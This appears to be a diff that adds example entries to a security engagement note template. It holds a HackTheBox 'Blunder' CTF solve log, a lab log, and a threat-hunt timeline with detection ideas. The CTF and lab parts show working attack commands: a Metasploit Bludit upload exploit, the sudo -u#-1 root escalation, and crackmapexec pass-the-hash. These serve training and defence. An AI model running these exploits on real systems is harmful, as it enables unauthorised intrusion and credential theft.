@@ -217,3 +217,210 @@ service installation, or UAC bypass was observed in this pass.
 | 9 | `shot_009.png` | **Procmon (Registry filter)** | Run key write, InvoiceHelper config hive |
 | 10 | `shot_010.png` | **TCPView** | Active connection to 192.0.2.47:8080 |
 | 11 | `shot_011.png` | **Wireshark** | POST /gate.php and POST /log.php captures |
+
+---
+
+## Complete example -- CTF (solve attempt)
+
+**Engagement:** `sample_EX` -- HackTheBox "Blunder" (Retired), continuing from recon phase.
+
+---
+
+### Session metadata
+
+| Field | Value |
+|-------|-------|
+| Target IP | 10.10.10.191 |
+| Auth credentials | `fergus:RolandDeschain` (from recon phase) |
+| Exploit references | EDB-47699 (Bludit dir traversal upload) |
+| Date | 2026-05-11 |
+| Machine | Kali Linux (local VM) |
+
+---
+
+### Approach log
+
+#### Step 1 -- Exploit directory traversal upload (CVE-2019-16113)
+
+`ash
+msfconsole
+use exploit/linux/http/bludit_upload_images_exec
+set RHOSTS 10.10.10.191
+set BLUDITUSER fergus
+set BLUDITPASS RolandDeschain
+run
+`
+
+**Result:** Shell returned as www-data.
+
+#### Step 2 -- User enumeration
+
+`ash
+cat /etc/passwd | grep -v nologin | grep -v false
+`
+
+| User | Home |
+|------|------|
+| root | /root |
+| hugo | /home/hugo |
+
+#### Step 3 -- Credential search
+
+`ash
+find / -name "users.php" 2>/dev/null
+`
+
+Found sha1 hash for hugo in /var/www/bludit-3.10.0a. Cracked with hashcat -m 100 -- result: **Password120**.
+
+#### Step 4 -- User flag
+
+`ash
+su hugo
+cat /home/hugo/user.txt
+`
+
+User flag obtained. (Redacted -- public_writeup_safe: false)
+
+#### Step 5 -- Root via CVE-2019-14287
+
+`ash
+sudo -l
+# (ALL, !root) NOPASSWD: /bin/bash
+sudo -u#-1 /bin/bash
+id    # uid=0(root)
+cat /root/root.txt
+`
+
+Root flag obtained. Box fully solved.
+
+---
+
+### Dead ends
+
+| Attempt | Result |
+|---------|--------|
+| FTP port 21 | Filtered |
+| SSH with fergus credentials | Port closed |
+| bludit-3.9.2 user DB | Empty -- had to find 3.10.0a path |
+
+---
+
+### Screenshots index
+
+| # | File | Tool | What it shows |
+|---|------|------|---------------|
+| 5 | shot_005.png | **Metasploit** | Shell as www-data |
+| 6 | shot_006.png | **Terminal** | users.php hugo hash |
+| 7 | shot_007.png | **Terminal** | su hugo, user.txt |
+| 8 | shot_008.png | **Terminal** | sudo -l output |
+| 9 | shot_009.png | **Terminal** | sudo -u#-1, id=root, root.txt |
+
+Cross-references: [brief](../00_original/sample_EX.md) | [recon](../01_static/sample_EX.md) | [writeup](../03_findings/sample_EX.md)
+
+---
+
+## Complete example -- Lab (results / objectives)
+
+**Engagement:** `sample_EX` -- TCM Security Practical Ethical Hacking, Module 8, continuing from step log.
+
+---
+
+### Objectives completion
+
+| # | Objective | Status |
+|---|-----------|--------|
+| 1 | Capture NTLMv2 hash via LLMNR poisoning | **Met** |
+| 2 | Crack captured hash | **Met** -- Password1 |
+| 3 | Enumerate SMB shares after auth | **Met** |
+| 4 | Identify pass-the-hash opportunity | **Met** |
+
+### SMB share enumeration
+
+`ash
+crackmapexec smb 192.168.64.0/24 -u fcastle -p 'Password1' --shares
+`
+
+| Host | Share | Access |
+|------|-------|--------|
+| HYDRA-DC | SYSVOL | READ |
+| HYDRA-DC | NETLOGON | READ |
+| WORKSTATION-01 | C$ | No access |
+
+### Pass-the-hash
+
+`ash
+crackmapexec smb 192.168.64.0/24 -u peterparker -H '<NTLMhash>'
+`
+
+Result: WORKSTATION-02 **Pwn3d!** -- local admin confirmed.
+
+### Errors encountered
+
+| Step | Error | Resolution |
+|------|-------|-----------|
+| crackmapexec | No entries | Forgot -u flag |
+| hashcat | No hashes loaded | NTLMv2 hash truncated on paste |
+
+---
+
+### Screenshots index
+
+| # | File | Tool | What it shows |
+|---|------|------|---------------|
+| 3 | shot_003.png | **crackmapexec** | SMB share list |
+| 4 | shot_004.png | **crackmapexec** | Pass-the-hash Pwn3d! |
+
+Cross-references: [setup](../00_original/sample_EX.md) | [procedure](../01_static/sample_EX.md) | [reflection](../03_findings/sample_EX.md)
+
+---
+
+## Complete example -- Hunt (analysis / timeline)
+
+**Engagement:** `sample_EX` -- Internal hunt: LSASS credential access, continuing from collection.
+
+---
+
+### Timeline reconstruction
+
+| Timestamp | Host | Event | Source |
+|-----------|------|-------|--------|
+| 2026-04-22 13:52 | WRK-04 | winword.exe opened Q1_Report.docx | Sysmon 1 |
+| 2026-04-22 13:53 | WRK-04 | winword.exe spawned powershell.exe -enc | Sysmon 1 |
+| 2026-04-22 13:54 | WRK-04 | PowerShell wrote C:\Windows\Temp\svch0st.exe | Sysmon 11 |
+| 2026-04-22 13:58 | WRK-04 | svch0st.exe executed (parent: powershell) | Sysmon 1 |
+| 2026-04-22 14:03 | WRK-04 | svch0st.exe accessed lsass.exe 0x1FFFFF | Sysmon 10 |
+| 2026-04-22 14:04 | WRK-04 | svch0st.exe wrote C:\Windows\Temp\kr.tmp | Sysmon 11 |
+| 2026-04-22 14:06 | WRK-04 | Outbound 443 to 185.220.x.x from svch0st.exe | Sysmon 3 |
+| 2026-04-22 14:09 | WRK-04 | svch0st.exe deleted kr.tmp and itself | Sysmon 23 |
+
+---
+
+### False positive triage
+
+| Signal | FP or TP? | Reasoning |
+|--------|-----------|-----------|
+| MsMpEng.exe LSASS 0x1410 | FP | Regular Defender scan |
+| svch0st.exe LSASS 0x1FFFFF | **TP** | Leet-spelling + Temp path + PROCESS_ALL_ACCESS |
+| kr.tmp create/delete 5 min | **TP** | Dump then cleanup sequence |
+| Outbound 443 from svch0st.exe | **TP** | Non-browser to non-CDN IP |
+
+---
+
+### Detection recommendations
+
+1. Sigma rule: winword.exe -> powershell.exe -enc chain.
+2. Alert: LSASS 0x1FFFFF from non-allowlisted process.
+3. Alert: .exe drop to C:\Windows\Temp from Office processes.
+4. Block: 185.220.x.x range (Tor relay / confirmed C2).
+
+---
+
+### Screenshots index
+
+| # | File | Tool | What it shows |
+|---|------|------|---------------|
+| 4 | shot_004.png | **Elastic SIEM** | WRK-04 full timeline |
+| 5 | shot_005.png | **Elastic SIEM** | FP triage: MsMpEng vs svch0st |
+| 6 | shot_006.png | **Sigma** | Draft detection rule |
+
+Cross-references: [brief](../00_original/sample_EX.md) | [collection](../01_static/sample_EX.md) | [outcome](../03_findings/sample_EX.md)
